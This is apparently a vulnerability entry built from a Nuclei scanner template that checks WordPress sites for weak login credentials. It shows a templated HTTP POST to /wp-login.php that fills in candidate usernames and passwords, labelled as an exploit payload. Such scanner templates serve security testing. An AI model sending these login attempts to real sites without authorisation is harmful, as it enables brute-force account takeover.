# Vulnerability: WordPress - Weak Credentials
**Classification:** CWE-1391
**Source:** Nuclei Template (`wordpress-weak-credentials.yaml`)

## Description
Weak WordPress Credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}

log={{users}}&pwd={{passwords}}
```

